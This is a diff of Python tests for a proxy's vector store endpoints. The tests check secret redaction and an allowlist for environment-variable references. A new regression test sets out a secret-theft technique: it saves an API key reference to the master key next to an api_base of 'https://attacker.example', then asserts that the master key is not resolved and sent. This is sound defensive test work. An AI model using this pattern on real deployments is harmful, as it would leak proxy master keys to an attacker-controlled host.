@@ -2879,7 +2879,9 @@ class TestUpdateVectorStoreAccessControlAndRedaction:
         assert "api_base" not in response["vector_store"]["litellm_params"]
 
         resolved = build_request_data_from_managed_vector_store(
-            LiteLLM_ManagedVectorStore(vector_store_id="vs_owned", litellm_params=persisted)
+            LiteLLM_ManagedVectorStore(
+                vector_store_id="vs_owned", custom_llm_provider="mongodb", litellm_params=persisted
+            )
         )
         assert (
             MongoDBVectorStoreConfig().get_complete_url(api_base=resolved.get("api_base"), litellm_params=resolved)
@@ -2939,6 +2941,7 @@ class TestUpdateVectorStoreAccessControlAndRedaction:
         from litellm.types.vector_stores import VectorStoreUpdateRequest
 
         monkeypatch.setenv("SOME_SECRET", "sk-resolved-from-env")
+        monkeypatch.setenv("LITELLM_VECTOR_STORE_ENV_REFERENCE_ALLOWLIST", "mongodb:SOME_SECRET")
 
         saved = {"mongodb_database": "knowledge", "api_key": "sk-real-secret"}
         mock_prisma_client = self._mock_prisma_for_update(saved)
@@ -2972,7 +2975,9 @@ class TestUpdateVectorStoreAccessControlAndRedaction:
         assert response["vector_store"]["litellm_params"]["api_key"] == REDACTED_BY_LITELM_STRING
 
         resolved = build_request_data_from_managed_vector_store(
-            LiteLLM_ManagedVectorStore(vector_store_id="vs_owned", litellm_params=persisted)
+            LiteLLM_ManagedVectorStore(
+                vector_store_id="vs_owned", custom_llm_provider="mongodb", litellm_params=persisted
+            )
         )
         assert resolved["api_key"] == "sk-resolved-from-env"
 
@@ -3342,20 +3347,41 @@ def test_vector_store_search_rejects_caller_embedding_selection_params(blocked_k
     assert blocked_key in str(response.json())
 
 
-def test_build_request_data_from_managed_vector_store_resolves_environment_references(monkeypatch):
+def test_build_request_data_from_managed_vector_store_never_resolves_a_saved_proxy_secret(monkeypatch):
+    """Regression: any key with vector store access could save api_key os.environ/LITELLM_MASTER_KEY next to its
+    own api_base, and the next search sent the resolved master key to that host."""
     from litellm.proxy.vector_store_endpoints.endpoints import build_request_data_from_managed_vector_store
     from litellm.types.vector_stores import LiteLLM_ManagedVectorStore
 
-    monkeypatch.setenv("SIDECAR_KEY_FOR_TEST", "from-environment")
+    monkeypatch.setenv("LITELLM_MASTER_KEY", "sk-master")
+    monkeypatch.delenv("LITELLM_VECTOR_STORE_ENV_REFERENCE_ALLOWLIST", raising=False)
+    for provider in ("openai", "mongodb"):
+        store = LiteLLM_ManagedVectorStore(
+            vector_store_id="exfiltrate",
+            custom_llm_provider=provider,
+            litellm_params={"api_base": "https://attacker.example", "api_key": "os.environ/LITELLM_MASTER_KEY"},
+        )
+
+        data = build_request_data_from_managed_vector_store(store)
+
+        assert data["api_key"] == "os.environ/LITELLM_MASTER_KEY"
+        assert "sk-master" not in data.values()
+
+
+def test_build_request_data_from_managed_vector_store_resolves_the_deployment_sidecar_key(monkeypatch):
+    from litellm.proxy.vector_store_endpoints.endpoints import build_request_data_from_managed_vector_store
+    from litellm.types.vector_stores import LiteLLM_ManagedVectorStore
+
+    monkeypatch.setenv("MONGODB_SIDECAR_API_KEY", "deployment-key")
     store = LiteLLM_ManagedVectorStore(
         vector_store_id="policy_index",
         custom_llm_provider="mongodb",
-        litellm_params={"api_base": "https://sidecar.example", "api_key": "os.environ/SIDECAR_KEY_FOR_TEST"},
+        litellm_params={"api_base": "https://sidecar.example", "api_key": "os.environ/MONGODB_SIDECAR_API_KEY"},
     )
 
     data = build_request_data_from_managed_vector_store(store)
 
-    assert data["api_key"] == "from-environment"
+    assert data["api_key"] == "deployment-key"
     assert data["api_base"] == "https://sidecar.example"
     assert data["custom_llm_provider"] == "mongodb"
 
